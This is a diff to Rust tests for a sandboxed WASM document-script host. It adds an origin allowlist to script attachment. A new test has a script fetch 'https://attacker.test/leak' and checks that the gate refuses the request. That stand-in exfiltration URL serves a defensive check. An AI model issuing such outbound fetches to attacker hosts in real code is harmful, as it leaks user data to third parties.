@@ -61,7 +61,7 @@ fn script_mutates_a_caller_provided_dom_and_reads_back() {
     assert_eq!(body_count_before, 1, "body starts with one <p>");
 
     let mut script =
-        DocumentScript::attach(&doc_wasm(), dom, &Grant::allow_all(), Quota::default(), None)
+        DocumentScript::attach(&doc_wasm(), dom, &Grant::allow_all(), Quota::default(), None, Vec::new())
             .expect("attach should succeed under the full grant");
     assert_eq!(script.revision(), 0);
 
@@ -107,7 +107,7 @@ fn precompiled_cwasm_attaches_and_drives_without_codegen() {
     std::fs::write(&path, &cwasm).expect("write cwasm");
 
     let (dom, _body, t1) = page();
-    let mut script = DocumentScript::attach(&path, dom, &Grant::allow_all(), Quota::default(), None)
+    let mut script = DocumentScript::attach(&path, dom, &Grant::allow_all(), Quota::default(), None, Vec::new())
         .expect("attach from a precompiled .cwasm");
     assert_eq!(
         script.deliver_event("set", "Edited via AOT").expect("turn"),
@@ -126,14 +126,48 @@ fn a_granted_script_fetches_through_the_async_net_import() {
     // which imports `net` — would fail to instantiate.
     let (dom, _body, t1) = page();
     let fetcher: Arc<dyn NetFetcher> = Arc::new(EchoFetcher);
-    let mut script =
-        DocumentScript::attach(&doc_wasm(), dom, &Grant::allow_all(), Quota::default(), Some(fetcher))
-            .expect("attach with net granted");
+    let mut script = DocumentScript::attach(
+        &doc_wasm(),
+        dom,
+        &Grant::allow_all(),
+        Quota::default(),
+        Some(fetcher),
+        vec!["example.com".to_string()],
+    )
+    .expect("attach with net granted");
     let out = script.deliver_event("fetch", "https://example.com/x").expect("fetch turn");
     assert_eq!(out, TurnOutcome::Applied(1));
     assert_eq!(
         text_of(script.dom(), t1).as_deref(),
         Some("fetched:https://example.com/x"),
         "the injected fetcher's response landed in the live DOM",
+    );
+}
+
+#[test]
+fn a_cross_origin_fetch_is_refused_by_the_origin_gate() {
+    // §E1 origin-scoped net: `net` is granted and a backend is wired, but the
+    // instance's allowlist is example.com, so a fetch to a third-party host is
+    // refused at the host boundary (the credentialed-SSRF / exfil channel is closed).
+    let (dom, _body, t1) = page();
+    let fetcher: Arc<dyn NetFetcher> = Arc::new(EchoFetcher);
+    let mut script = DocumentScript::attach(
+        &doc_wasm(),
+        dom,
+        &Grant::allow_all(),
+        Quota::default(),
+        Some(fetcher),
+        vec!["example.com".to_string()],
+    )
+    .expect("attach with net granted");
+    let out = script.deliver_event("fetch", "https://attacker.test/leak").expect("turn completes");
+    assert!(
+        matches!(out, TurnOutcome::Refused(_)),
+        "a fetch outside the allowlist is refused, not performed (got {out:?})",
+    );
+    assert_eq!(
+        text_of(script.dom(), t1).as_deref(),
+        Some("Hello"),
+        "the live DOM is untouched: no third-party response landed",
     );
 }
